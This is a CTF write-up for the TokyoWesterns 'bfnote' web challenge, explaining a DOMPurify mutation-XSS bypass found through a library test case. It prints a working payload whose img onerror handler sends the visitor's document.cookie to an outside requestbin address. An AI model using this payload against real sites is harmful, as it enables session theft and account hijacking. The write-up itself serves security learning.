# bfnote
Category: Web

Solves: 18, Score: 320  

> Share your best Brainf*ck code at [bfnote](https://bfnote.chal.ctf.westerns.tokyo/)

The website allows a user to upload some brainfuck code and executes it when visited. The backend code is not that important, but can be viewed using [https://bfnote.chal.ctf.westerns.tokyo/?source](https://bfnote.chal.ctf.westerns.tokyo/?source)

The user input is sanitized using `DOMPurify`. We did some DOM clobbering to overwrite `CONFIG`and set `unsafeRender`, but had no idea how to solve this challenge. The next morning we started to look at it again. One of our team members noticed that 10 minutes before cure53 [tweeted](https://twitter.com/cure53berlin/status/1307602849455640576) about a new release that fixed a mXSS variation. That was unfortunate, but since it was a competetion we just did a git diff and found the payload in a test.
```js
{
      "title": "Tests against nesting-based mXSS behavior 2/2",
      "payload": "<math><mtext><table><mglyph><style><math>CLICKME</math>",
      "expected": [
          ""
      ]
}
```

Based on this we created a simple payload to exfiltrate the cookie:
```html
<math><mtext><table><mglyph><style><math><img src="1" onerror="document.location.href=window.a.href+document.cookie"></math><a id=a href="//requestbin.net/r/y3usnuy3/"></a>
```

## Flag
```
TWCTF{reCAPTCHA_Oriented_Programming_with_XSS!}
```